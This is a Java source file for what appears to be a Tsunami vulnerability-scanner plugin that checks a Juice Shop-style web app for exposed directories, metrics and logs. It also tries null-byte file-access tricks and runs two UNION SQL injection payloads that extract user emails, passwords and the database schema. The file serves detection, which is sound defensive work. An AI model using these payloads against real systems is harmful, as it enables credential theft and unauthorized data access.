/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.protobuf.ByteString;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SensitivedataexposuredetectorDetector",
    version = "0.1",
    description = "Detects SensitiveDataExposureDetector vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = SensitivedataexposuredetectorDetectorBootstrapModule.class)
public final class SensitivedataexposuredetectorDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public SensitivedataexposuredetectorDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Sensitivedataexposuredetector Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
            .addHeader("User-Agent", "Mozilla/5.0 (compatible; TsunamiScanner)")
            .build();

        // Test 1: Access FTP directory browsing
        HttpResponse ftpResponse = httpClient.send(
            HttpRequest.get(targetUri + "/ftp")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (ftpResponse.status().code() == 200) {
            String ftpBody = ftpResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (ftpBody.contains("acquisitions.md") || ftpBody.contains("legal.md") || 
                ftpBody.contains("package.json.bak")) {
                successfulAttacks++;
            }
        }

        // Test 2: Access Prometheus metrics endpoint
        HttpResponse metricsResponse = httpClient.send(
            HttpRequest.get(targetUri + "/metrics")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (metricsResponse.status().code() == 200) {
            String metricsBody = metricsResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (metricsBody.contains("prometheus") || metricsBody.contains("TYPE") || 
                metricsBody.contains("HELP") || metricsBody.contains("nodejs_")) {
                successfulAttacks++;
            }
        }

        // Test 3: Access support logs directory
        HttpResponse logsResponse = httpClient.send(
            HttpRequest.get(targetUri + "/support/logs")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (logsResponse.status().code() == 200) {
            String logsBody = logsResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (logsBody.contains("access.log") || logsBody.contains(".log")) {
                successfulAttacks++;
            }
        }

        // Test 4: Access backup files using poison null byte
        String[] backupFiles = {
            "/ftp/package.json.bak%2500.md",
            "/ftp/coupons_2013.md.bak%2500.md",
            "/ftp/suspicious_errors.yml%2500.md"
        };
        
        for (String backupFile : backupFiles) {
            HttpResponse backupResponse = httpClient.send(
                HttpRequest.get(targetUri + backupFile)
                    .setHeaders(headers)
                    .build(),
                networkService);
            
            if (backupResponse.status().code() == 200) {
                successfulAttacks++;
                break; // One successful backup file access is enough
            }
        }

        // Test 5: Access hidden language file
        HttpResponse langResponse = httpClient.send(
            HttpRequest.get(targetUri + "/i18n/tlh_AA.json")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (langResponse.status().code() == 200) {
            String langBody = langResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (langBody.contains("Klingon") || langBody.contains("tlh") || 
                langBody.startsWith("{")) {
                successfulAttacks++;
            }
        }

        // Test 6: SQL Injection to extract user credentials
        String sqlPayload = "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--";
        HttpResponse sqlResponse = httpClient.send(
            HttpRequest.get(
                targetUri + "/rest/products/search?q=" + 
                URLEncoder.encode(sqlPayload, StandardCharsets.UTF_8))
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (sqlResponse.status().code() == 200) {
            String sqlBody = sqlResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            Pattern emailPattern = Pattern.compile("[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}");
            Matcher emailMatcher = emailPattern.matcher(sqlBody);
            if (emailMatcher.find() && sqlBody.contains("password")) {
                successfulAttacks++;
            }
        }

        // Test 7: SQL Injection to extract database schema
        String schemaPayload = "qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--";
        HttpResponse schemaResponse = httpClient.send(
            HttpRequest.get(
                targetUri + "/rest/products/search?q=" + 
                URLEncoder.encode(schemaPayload, StandardCharsets.UTF_8))
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (schemaResponse.status().code() == 200) {
            String schemaBody = schemaResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            if (schemaBody.contains("CREATE TABLE") || schemaBody.contains("sqlite_master")) {
                successfulAttacks++;
            }
        }

        return successfulAttacks > 0;
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("Sensitive data exposure test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("SENSITIVEDATAEXPOSUREDETECTOR_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("SensitiveDataExposureDetector Vulnerability Exposed")
                .setDescription("The application is vulnerable to SensitiveDataExposureDetector attacks.")
                .setRecommendation(
                    "Implement proper security measures to prevent sensitive data exposure attacks."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("SENSITIVEDATAEXPOSUREDETECTOR_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("SensitiveDataExposureDetector Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to SensitiveDataExposureDetector attacks.")
            .setRecommendation(
                "Implement proper security measures to prevent sensitive data exposure attacks.")
        .build());
  }
}